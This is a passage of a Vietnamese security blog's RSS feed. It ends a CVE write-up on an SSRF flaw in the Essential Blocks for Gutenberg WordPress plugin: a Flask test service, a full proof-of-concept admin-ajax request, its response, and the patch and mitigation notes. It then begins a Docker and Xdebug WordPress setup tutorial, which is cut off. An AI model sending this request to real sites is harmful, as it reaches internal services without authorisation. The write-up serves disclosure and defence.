0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, jsonify, request, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/test&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;requirements.txt&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;hello&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi request với &lt;code&gt;image_url&lt;/code&gt; trỏ đến local service &lt;code&gt;http://127.0.0.1:8001/test&lt;/code&gt; bằng user &lt;strong&gt;Author&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-login.php?loggedout=true&amp;amp;wp_lang=en_US&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121&#xA;&#xA;action=save_ai_generated_image&amp;amp;admin_nonce=9433571df4&amp;amp;prompt=abc&amp;amp;image_url=http://127.0.0.1:8001/test&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;success&amp;#34;: true,&#xA;  &amp;#34;data&amp;#34;: {&#xA;    &amp;#34;attachment_id&amp;#34;: 355,&#xA;    &amp;#34;url&amp;#34;: &amp;#34;http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png&amp;#34;,&#xA;    &amp;#34;alt&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;    &amp;#34;title&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;    &amp;#34;caption&amp;#34;: &amp;#34;&amp;#34;,&#xA;    &amp;#34;description&amp;#34;: &amp;#34;&amp;#34;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Đọc file được lưu &lt;code&gt;http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png&lt;/code&gt; bằng &lt;strong&gt;BurpSuite&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/result.png&#34; title=&#34;Nội dung đọc được từ local service&#34; data-thumbnail=&#34;/posts/2025-10-22-cve-2025-11361/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Nội dung đọc được từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-cve-2025-11361/result.png&#39; alt=&#34;Result&#34; height=&#34;383&#34; width=&#34;1155&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung đọc được từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition information open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Information&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Không thể đọc nội dung trên ở trình duyệt, vì nội dung trong &lt;code&gt;ai-generated-abc-1761019403.png&lt;/code&gt; (&lt;code&gt;&#39;hello&#39;&lt;/code&gt;) không phù hợp với &lt;strong&gt;Content-Type: image/png&lt;/strong&gt; trả về, nên trình duyệt render ra lỗi.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 5.7.1&lt;/strong&gt; của &lt;strong&gt;Essential Blocks for Gutenberg&lt;/strong&gt; mắc lỗi &lt;strong&gt;SSRF&lt;/strong&gt; do dùng &lt;code&gt;wp_remote_get()&lt;/code&gt; tải URL không kiểm soát, cho phép user &lt;strong&gt;Author&lt;/strong&gt; gửi request đến địa chỉ nội bộ. Bản vá &lt;strong&gt;5.7.2&lt;/strong&gt; thay bằng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;, thêm kiểm tra mã phản hồi, MIME hợp lệ và xác thực nội dung hình ảnh, giúp ngăn chặn SSRF.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Cập nhật ngay lên &lt;strong&gt;v5.7.2&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; thay cho &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực phản hồi (HTTP code, MIME, nội dung).&lt;/li&gt;&#xA;&lt;li&gt;Giới hạn timeout, redirect và kích thước file.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra dữ liệu đầu vào và quyền user cẩn thận.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/essential-blocks/vulnerability/wordpress-essential-blocks-plugin-5-7-1-authenticated-author-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Essential Blocks for Gutenberg Plugin &amp;lt;= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Local and Debugging in Docker</title>
      <link>http://localhost:1313/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/</link>
      <pubDate>Wed, 22 Oct 2025 15:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/</guid>
      <category domain="http://localhost:1313/vi/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-wordpress-local-and-debugging-docker/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;Tiếp nối&lt;/strong&gt; phần hướng dẫn &lt;strong&gt;cài đặt WordPress trên môi trường local&lt;/strong&gt; ở &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;bài viết trước&lt;/a&gt;, bài này sẽ hướng dẫn bạn &lt;strong&gt;thiết lập WordPress bằng Docker&lt;/strong&gt; — một cách hiện đại, linh hoạt và dễ chia sẻ hơn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-use-docker&#34;&gt;&lt;span&gt;Why Use Docker?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-use-docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Docker cho phép bạn đóng gói toàn bộ môi trường chạy WordPress (PHP, MySQL, web server và mã nguồn) vào các container độc lập. Cách làm này mang lại nhiều lợi ích:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Đồng nhất môi trường&lt;/strong&gt;: Chạy giống nhau trên mọi máy, tránh lỗi “chạy được trên máy tôi”.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Dễ cài đặt và tái tạo&lt;/strong&gt;: Chỉ cần vài lệnh để khởi tạo hoặc reset toàn bộ hệ thống.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cách ly và an toàn&lt;/strong&gt;: Mỗi container là một môi trường riêng, tránh xung đột phần mềm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thuận tiện cho phát triển và debug&lt;/strong&gt;: Có thể bật Xdebug, theo dõi log, hoặc chỉnh PHP mà không ảnh hưởng đến hệ thống chính.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Dễ chia sẻ&lt;/strong&gt;: Chỉ cần gửi file &lt;code&gt;docker-compose.yml&lt;/code&gt; và các file cấu hình, người khác có thể khởi chạy cùng môi trường giống bạn — không cần cài đặt thủ công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Docker là &lt;strong&gt;giải pháp tối ưu&lt;/strong&gt; để phát triển, thử nghiệm và cộng tác trên các dự án WordPress, đặc biệt hữu ích cho lập trình viên, nhóm làm việc hoặc người làm pentest muốn có môi trường nhất quán, dễ tái sử dụng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup-wordpress-for-hacker-in-docker&#34;&gt;&lt;span&gt;Setup WordPress for Hacker in Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-wordpress-for-hacker-in-docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;prerequisites&#34;&gt;&lt;span&gt;Prerequisites&lt;/span&gt;&#xA;  &lt;a href=&#34;#prerequisites&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Trước tiên, bạn cần cài đặt &lt;strong&gt;Docker&lt;/strong&gt;. Công cụ này hỗ trợ trên nhiều hệ điều hành, mỗi nền tảng có cách cài đặt riêng.&lt;br&gt;&#xA;Xem hướng dẫn tại: &lt;a href=&#34;https://www.docker.com/get-started/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.docker.com/get-started/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;docker-compose&#34;&gt;&lt;span&gt;Docker Compose&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker-compose&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Thay vì chạy từng container thủ công bằng &lt;code&gt;docker run&lt;/code&gt;, ta dùng &lt;strong&gt;Docker Compose&lt;/strong&gt; để định nghĩa và quản lý nhiều container liên kết chỉ bằng &lt;strong&gt;một file cấu hình duy nhất&lt;/strong&gt; (&lt;code&gt;docker-compose.yml&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Với WordPress, ta cần:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Một container &lt;strong&gt;MySQL&lt;/strong&gt; để lưu cơ sở dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;Một container &lt;strong&gt;WordPress (PHP + web server)&lt;/strong&gt; để chạy mã nguồn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nếu làm thủ công, bạn sẽ phải nhập nhiều lệnh và cấu hình phức tạp.&lt;br&gt;&#xA;Với Docker Compose, tất cả nằm trong một file YAML giúp:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Dễ cài đặt&lt;/strong&gt;: &lt;code&gt;docker-compose up -d&lt;/code&gt; là có đủ WordPress + MySQL.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Dễ chia sẻ&lt;/strong&gt;: Người khác chỉ cần cùng file &lt;code&gt;docker-compose.yml&lt;/code&gt; là chạy được.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Dễ mở rộng&lt;/strong&gt;: Thêm phpMyAdmin, Nginx, hoặc Xdebug chỉ cần vài dòng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Xem hướng dẫn cài Docker Compose tại: &lt;a href=&#34;https://docs.docker.com/compose/install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.docker.com/compose/install/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;installing-wordpress-with-docker-compose-and-xdebug&#34;&gt;&lt;span&gt;Installing WordPress with Docker Compose and Xdebug&lt;/span&gt;&#xA;  &lt;a href=&#34;#installing-wordpress-with-docker-compose-and-xdebug&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phần này hướng dẫn cài &lt;strong&gt;WordPress với Docker Compose&lt;/strong&gt;, tích hợp &lt;strong&gt;Xdebug&lt;/strong&gt; để debug trực tiếp trong &lt;strong&gt;VS Code&lt;/strong&gt;.&lt;br&gt;&#xA;Cách này giúp bạn có môi trường phát triển đầy đủ, dễ gỡ lỗi và mở rộng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Cấu trúc thư mục:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.&#xA;├── wordpress&#xA;├── docker-compose.yml&#xA;├── Dockerfile&#xA;├── php.ini&#xA;└── .vscode&#xA;    └── launch.json&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;setup-environment&#34;&gt;&lt;span&gt;Setup Environment&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-environment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 